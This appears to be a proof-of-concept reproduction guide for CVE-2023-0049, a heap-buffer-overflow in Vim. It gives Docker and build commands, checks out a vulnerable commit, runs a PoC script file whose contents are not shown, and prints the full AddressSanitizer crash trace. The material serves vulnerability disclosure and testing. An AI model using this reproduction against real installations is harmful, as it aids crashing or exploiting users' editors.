### CVE-2023-0049

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/5e6f325c-ba54-4bf0-b050-dca048fd3fd9)

### Docker Container Run Command
```shell
docker build -t cve-2023-0049-poc .
docker run -itd --name CVE-2023-0049-POC cve-2023-0049-poc
docker exec -it CVE-2023-0049-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard ea720aea851e645f4c8ec3b20afb27c7ca38184c

# Install the compilation and installation dependencies for Vim.
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_hor01_s.dat -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_hor01_s.dat -c :qa!
```

### Description
Observed that:
```shell
=================================================================
==9630==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff90206575 at pc 0xaaaae2423fb8 bp 0xffffcf230680 sp 0xffffcf230690
READ of size 1 at 0xffff90206575 thread T0
#0 0xaaaae2423fb4  (/usr/local/bin/vim+0x197fb4)
#1 0xaaaae2959578  (/usr/local/bin/vim+0x6cd578)
#2 0xaaaae24d1de4  (/usr/local/bin/vim+0x245de4)
#3 0xaaaae24d0cd8  (/usr/local/bin/vim+0x244cd8)
#4 0xaaaae24e6ad4  (/usr/local/bin/vim+0x25aad4)
#5 0xaaaae2cd59a4  (/usr/local/bin/vim+0xa499a4)
#6 0xaaaae2616cfc  (/usr/local/bin/vim+0x38acfc)
#7 0xaaaae2608774  (/usr/local/bin/vim+0x37c774)
#8 0xaaaae2605b84  (/usr/local/bin/vim+0x379b84)
#9 0xaaaae27c81b8  (/usr/local/bin/vim+0x53c1b8)
#10 0xaaaae27b0b40  (/usr/local/bin/vim+0x524b40)
#11 0xaaaae25e4e6c  (/usr/local/bin/vim+0x358e6c)
#12 0xaaaae25e4bc8  (/usr/local/bin/vim+0x358bc8)
#13 0xaaaae25e4298  (/usr/local/bin/vim+0x358298)
#14 0xaaaae25baa30  (/usr/local/bin/vim+0x32ea30)
#15 0xaaaae25afb38  (/usr/local/bin/vim+0x323b38)
#16 0xaaaae297f274  (/usr/local/bin/vim+0x6f3274)
#17 0xaaaae29805fc  (/usr/local/bin/vim+0x6f45fc)
#18 0xaaaae297cb40  (/usr/local/bin/vim+0x6f0b40)
#19 0xaaaae297cb9c  (/usr/local/bin/vim+0x6f0b9c)
#20 0xaaaae25baa30  (/usr/local/bin/vim+0x32ea30)
#21 0xaaaae25afb38  (/usr/local/bin/vim+0x323b38)
#22 0xaaaae25ada70  (/usr/local/bin/vim+0x321a70)
#23 0xaaaae2cdc55c  (/usr/local/bin/vim+0xa5055c)
#24 0xaaaae2cd43dc  (/usr/local/bin/vim+0xa483dc)
#25 0xaaaae2cd3ac4  (/usr/local/bin/vim+0xa47ac4)
#26 0xffff94df73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#27 0xffff94df74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#28 0xaaaae23e55ac  (/usr/local/bin/vim+0x1595ac)

0xffff90206575 is located 0 bytes to the right of 5-byte region [0xffff90206570,0xffff90206575)
allocated by thread T0 here:
#0 0xffff9511a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaae23e5b04  (/usr/local/bin/vim+0x159b04)
#2 0xaaaae23e588c  (/usr/local/bin/vim+0x15988c)
#3 0xaaaae2a26cd8  (/usr/local/bin/vim+0x79acd8)
#4 0xaaaae2959534  (/usr/local/bin/vim+0x6cd534)
#5 0xaaaae24d1de4  (/usr/local/bin/vim+0x245de4)
#6 0xaaaae24d0cd8  (/usr/local/bin/vim+0x244cd8)
#7 0xaaaae24e6ad4  (/usr/local/bin/vim+0x25aad4)
#8 0xaaaae2cd59a4  (/usr/local/bin/vim+0xa499a4)
#9 0xaaaae2616cfc  (/usr/local/bin/vim+0x38acfc)
#10 0xaaaae2608774  (/usr/local/bin/vim+0x37c774)
#11 0xaaaae2605b84  (/usr/local/bin/vim+0x379b84)
#12 0xaaaae27c81b8  (/usr/local/bin/vim+0x53c1b8)
#13 0xaaaae27b0b40  (/usr/local/bin/vim+0x524b40)
#14 0xaaaae25e4e6c  (/usr/local/bin/vim+0x358e6c)
#15 0xaaaae25e4bc8  (/usr/local/bin/vim+0x358bc8)
#16 0xaaaae25e4298  (/usr/local/bin/vim+0x358298)
#17 0xaaaae25baa30  (/usr/local/bin/vim+0x32ea30)
#18 0xaaaae25afb38  (/usr/local/bin/vim+0x323b38)
#19 0xaaaae297f274  (/usr/local/bin/vim+0x6f3274)
#20 0xaaaae29805fc  (/usr/local/bin/vim+0x6f45fc)
#21 0xaaaae297cb40  (/usr/local/bin/vim+0x6f0b40)
#22 0xaaaae297cb9c  (/usr/local/bin/vim+0x6f0b9c)
#23 0xaaaae25baa30  (/usr/local/bin/vim+0x32ea30)
#24 0xaaaae25afb38  (/usr/local/bin/vim+0x323b38)
#25 0xaaaae25ada70  (/usr/local/bin/vim+0x321a70)
#26 0xaaaae2cdc55c  (/usr/local/bin/vim+0xa5055c)
#27 0xaaaae2cd43dc  (/usr/local/bin/vim+0xa483dc)
#28 0xaaaae2cd3ac4  (/usr/local/bin/vim+0xa47ac4)
#29 0xffff94df73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/local/bin/vim+0x197fb4)
Shadow bytes around the buggy address:
0x200ff2040c50: fa fa 01 fa fa fa 05 fa fa fa 05 fa fa fa fd fa
0x200ff2040c60: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa
0x200ff2040c70: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa
0x200ff2040c80: fa fa 07 fa fa fa fd fa fa fa fd fa fa fa 06 fa
0x200ff2040c90: fa fa fd fa fa fa fd fa fa fa fa fa fa fa fa fa
=>0x200ff2040ca0: fa fa fa fa fa fa 00 03 fa fa fd fd fa fa[05]fa
0x200ff2040cb0: fa fa 01 fa fa fa 07 fa fa fa 00 07 fa fa 01 fa
0x200ff2040cc0: fa fa 05 fa fa fa 00 fa fa fa 00 03 fa fa 02 fa
0x200ff2040cd0: fa fa 07 fa fa fa 02 fa fa fa 01 fa fa fa 01 fa
0x200ff2040ce0: fa fa 01 fa fa fa 01 fa fa fa 05 fa fa fa 01 fa
0x200ff2040cf0: fa fa 01 fa fa fa 07 fa fa fa 01 fa fa fa 00 02
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9630==ABORTING
```



